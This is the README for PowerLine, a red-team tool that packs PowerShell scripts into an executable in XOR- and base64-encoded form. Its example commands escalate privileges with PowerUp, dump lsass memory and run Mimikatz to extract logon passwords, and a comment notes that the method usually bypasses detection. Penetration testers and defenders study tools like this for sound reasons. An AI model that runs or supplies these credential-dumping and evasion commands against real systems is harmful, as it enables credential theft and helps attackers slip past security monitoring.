# PowerLine
 (clone from https://github.com/fullmetalcache/PowerLine with localFile)
Download the Repo

Run the build.bat file

Update the UserConf.xml document to contain the URLs of the scripts that you'd like to include (examples shown)

Run the PLBuilder.exe file

The PowerLine.exe program should now be created and contains embedded, xor-encoded, base64-encoded versions of all of the scripts that you specified

Example Usage:

//Shows scripts that are currently embedded in the program

    PowerLine.exe -ShowScripts

//Run Invoke-AllChecks from the PowerUp script

    PowerLine.exe PowerUp "Invoke-AllChecks"

//Get a dump of the lsass process. Must run as an admin

    PowerLine.exe Out-Minidump "Get-Process lsass | Out-Minidump"

//Run mimikatz against the dump file created by the Out-Minidump command to extract creds. lsass_dump_name.dmp will be the name generated by Out-Minidump

//Yes, it's hellacious escaping but it works and usually bypasses detection =)

    PowerLine.exe Invoke-Mimikatz "Invoke-Mimikatz -Command \"`\"sekurlsa::minidump lsass_dump_name.dmp`\" `\"sekurlsa::logonPasswords`\"\""